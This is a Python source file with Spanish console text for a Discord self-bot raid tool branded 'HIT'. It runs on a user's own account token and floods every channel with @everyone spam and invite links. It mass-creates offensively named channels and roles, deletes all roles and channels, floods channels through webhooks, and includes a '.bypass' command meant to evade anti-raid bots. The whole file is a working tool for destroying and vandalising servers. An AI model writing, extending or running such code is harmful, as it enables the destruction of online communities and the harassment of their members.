import discord
import asyncio
import aiohttp
import random

def pedir_token():
    print("┌───────────────────────────────┐")
    print("│   Introduce tu token abajo    │")
    print("└───────────────────────────────┘")
    return input("> ")

TOKEN = pedir_token()
PREFIX = "."

RAID_MESSAGES = [
    "@everyone `░▒▓█►─═  𝐫𝕒𝔦∂-ᗷ¥-ⒽĮţ ═─◄█▓▒░` | discord.gg/z97Q5X2Vt2 | https://discord.gg/rHsaqthVHf | https://youtu.be/CiIBeR4ZD6U?si=w3v5CTCsu8vBOmGT | https://images-ext-1.discordapp.net/external/pBe4YYTxdnPYtRe18CsOAnr-WjWcboHlFEOALTz7Yew/https/i.imgur.com/gq5MJR3.mp4",
    "@everyone `𝖕𝖜𝖓𝖊𝖉 𝖇𝖞 𝖍𝖎𝖙` **ｒａｉｄ－ｂｙ－ｈｉｔ** | https://discord.gg/rHsaqthVHf | discord.gg/z97Q5X2Vt2 | https://youtu.be/CiIBeR4ZD6U?si=w3v5CTCsu8vBOmGT | https://th.bing.com/th/id/R.5af374a129e1b7fe5385bdd39a4f8521?rik=bS3G%2f7O0CpWVBQ&riu=http%3a%2f%2fimg.mp.itc.cn%2fupload%2f2017062"
]


class SelfBot(discord.Client):
    async def on_ready(self):
        ascii_art = r"""
██╗░░██╗██╗████████╗  ██████╗░░█████╗░██╗██████╗░
██║░░██║██║╚══██╔══╝  ██╔══██╗██╔══██╗██║██╔══██╗
███████║██║░░░██║░░░  ██████╔╝███████║██║██║░░██║
██╔══██║██║░░░██║░░░  ██╔══██╗██╔══██║██║██║░░██║
██║░░██║██║░░░██║░░░  ██║░░██║██║░░██║██║██████╔╝
╚═╝░░╚═╝╚═╝░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
"""
        print(ascii_art)
        print(f"\nConectado como {self.user} (ID: {self.user.id})\n")
        print("Comandos disponibles:")
        print(".spam (msg)   → Spamea en cada canal 5 veces")
        print(".mass         → Crea 50 canales y spamea ")
        print(".massr        → Crea 50 roles")
        print(".delr         → Elimina todos los roles")
        print(".delc         → Elimina todos los canales")
        print(".wh           → Crea webhook en cada canal y spamea aleatoriamente")
        print(".bypass       → Bypassea bot antiraids")


    async def on_message(self, message: discord.Message):
        if message.author.id != self.user.id:
            return
        # .spam (mensaje)
        if message.content.startswith(f"{PREFIX}spam "):
            await message.delete() 
            msg = message.content[len(f"{PREFIX}spam "):]
            for channel in message.guild.text_channels:
                for _ in range(5):
                    try:
                        await channel.send(msg)
                    except:
                        pass
            print(f"[SPAM] Mensaje spameado en todos los canales: {msg}")

        # .mass
        if message.content == ".mass":
            await message.delete()
            created_channels = []
            try:
                names = ["𝖍𝖎𝖙-𝖔𝖓-𝖌𝖛𝖓𝖌", "ｈｉ𝖙－ｏ𝖓－ｔｏｐ", "𝐟𝐮𝐜𝐤𝐞𝐝-𝐛𝐲-𝐡𝐢𝖙"]
                for i in range(30):
                    try:
                        name = random.choice(names)
                        ch = await message.guild.create_text_channel(name)
                        created_channels.append(ch)

                        for _ in range(5):
                            raid_msg = random.choice(RAID_MESSAGES)
                            await ch.send(raid_msg)
                        print(f"[MASS] Canal creado y spameado: {ch}")
                    except:
                        pass
            except:
                pass

        # .massr
        elif message.content == f"{PREFIX}massr":
            await message.delete() 
            for i in range(50):
                try:
                    await message.guild.create_role(name=f"FUCKYOU-{i}")
                    print(f"[MASSR] Rol creado: FUCKYOU-{i}")
                except:
                    pass

        # .delr
        elif message.content == f"{PREFIX}delr":
            await message.delete()
            for role in message.guild.roles:
                try:
                    await role.delete()
                    print(f"[DELR] Rol eliminado: {role}")
                except:
                    pass

        # .delc
        elif message.content == f"{PREFIX}delc":
            await message.delete() 
            for channel in message.guild.channels:
                try:
                    await channel.delete()
                    print(f"[DELC] Canal eliminado: {channel}")
                except:
                    pass

        # .wh
        elif message.content == f"{PREFIX}wh":
            await message.delete() 
            for channel in message.guild.text_channels:
                try:
                    webhook = await channel.create_webhook(name="HIT")
                    for _ in range(5):
                        try:
                            await webhook.send(random.choice(RAID_MESSAGES))
                        except:
                            pass
                    print(f"[WH] Webhook creado y spameado en {channel}")
                except:
                    pass

        # .bypass
        elif message.content == f"{PREFIX}bypass":
            await message.delete() 
            for channel in message.guild.channels:
                try:
                    if isinstance(channel, discord.TextChannel):
                        await channel.edit(name="𝔥𝔦𝔱-𝔬𝔫-𝔤𝔳𝔫𝔤")
                        print(f"[BYPASS] Renombrado canal de texto: {channel}")
                        try:
                            webhook = await channel.create_webhook(name="HIT")
                            for _ in range(5):
                                await webhook.send(random.choice(RAID_MESSAGES))
                            print(f"[BYPASS] Webhook spameado en {channel}")
                        except Exception:
                            pass
                    elif isinstance(channel, discord.VoiceChannel):
                        await channel.edit(name="𝔣𝔲𝔠𝔨-𝔟𝔶-𝔥𝔦𝔱")
                        print(f"[BYPASS] Renombrado canal de voz: {channel}")
                    elif isinstance(channel, discord.CategoryChannel):
                        await channel.edit(name="𝟒𝟎𝟒 𝐎𝐍 𝐓𝐎𝐏")
                        print(f"[BYPASS] Renombrada categoría: {channel}")
                except Exception:
                    pass

intents = discord.Intents.all()
client = SelfBot(intents=intents)
client.run(TOKEN, bot=False)
